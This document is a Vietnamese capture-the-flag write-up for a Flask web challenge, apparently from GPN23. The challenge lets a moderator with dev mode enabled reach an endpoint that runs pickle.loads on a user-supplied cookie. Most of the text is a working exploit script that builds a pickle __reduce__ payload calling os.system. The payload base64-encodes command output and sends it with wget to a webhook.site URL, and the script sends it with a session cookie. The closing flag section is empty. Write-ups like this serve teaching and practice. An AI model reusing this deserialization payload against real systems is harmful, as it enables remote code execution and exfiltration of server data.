![image](https://github.com/user-attachments/assets/fe6f5054-38f9-4c85-ba45-97d4f2150ade)

# **ANALYZE**

Mục tiêu của ta chính là lấy được FLAG_STAGE_5 – không phải qua HTTP route, mà được lưu ra file ngẫu nhiên trên server.

```
# setup.py
with open(f"flag_{uuid4().hex + uuid4().hex + uuid4().hex}.txt", "w") as f:
    f.write(FLAG_STAGE_5)
```
Tên file: flag_<96_hex_chars>.txt → không thể đoán (UUID4)

Flag không có route đọc trực tiếp → cần RCE hoặc arbitrary file read

Và chúng ta đã có được Secret_key kiếm được từ Stage_1 .

Và ở Stage_4 , ta đã enable dev mode 

Bây giờ ta cần RCE thông qua Pickle trong `/development/cookie-verify`

```
@app.route("/development/cookie-verify", methods=["POST"])
@login_required
@moderator_required
@development_routes_enabled
def verify_cookie():
    cookie = request.get_json().get("cookie")
    data = pickle.loads(base64.b64decode(cookie.encode()))
```
pickle.loads() trên dữ liệu người dùng → Deserialization RCE

# **EXPLOIT

Và là mod , nhưng đã được enable quyền dev thì ta hoàn toàn có thể RCE qua Pickle

```
fetch('/development/cookie-verify', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ cookie: "eyJ1c2VyIjp7InVzZXJuYW1lIjoiY2FuaGVldSIsInJvbGUiOiJtb2RlcmF0b3IifX0.aFpiHQ.h4DPKcG20y9JL2pEUGBY7GlAOYw" })
});

```

Và script để giải bài này chính là : 

```
import base64
import pickle
import hashlib
import os
import requests

# Step 1: Create malicious class for RCE
class RCE:
    def __reduce__(self):
        return (os.system, ("<command> | base64 | tr -d '\n' | xargs -I % wget https://webhook.site/c47162bb-f1c9-4a44-88ce-1703bcdad082?data=%",))

# Step 2: Forge payload
def create_payload():
    value = pickle.dumps(RCE())  # malicious object
    value_b64 = base64.b64encode(value)

    return value_b64

# Step 3: Send it to the target server
def send_payload(base_url, payload_cookie):
    url = f"{base_url}/development/cookie-verify"
    headers = {"Content-Type": "application/json","Cookie": f"session=eyJ1c2VyIjp7InJvbGUiOiJtb2RlcmF0b3IiLCJ1c2VybmFtZSI6ImJlbl96byJ9fQ.aFWT6w.k-H06KJiTLW1kPY2oALzkQYk1yY"}
    json_data = {"cookie": payload_cookie.decode()}

    resp = requests.post(url, json=json_data, headers=headers)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Response:\n{resp.text}")

# === CONFIG ===
base_url = "https://springford-of-indomitable-gold.gpn23.ctf.kitctf.de/"  # ⚠️ Change to target
# === EXECUTION ===
payload_cookie = create_payload()
print(payload_cookie)
send_payload(base_url, payload_cookie)
```





# **FLAG**

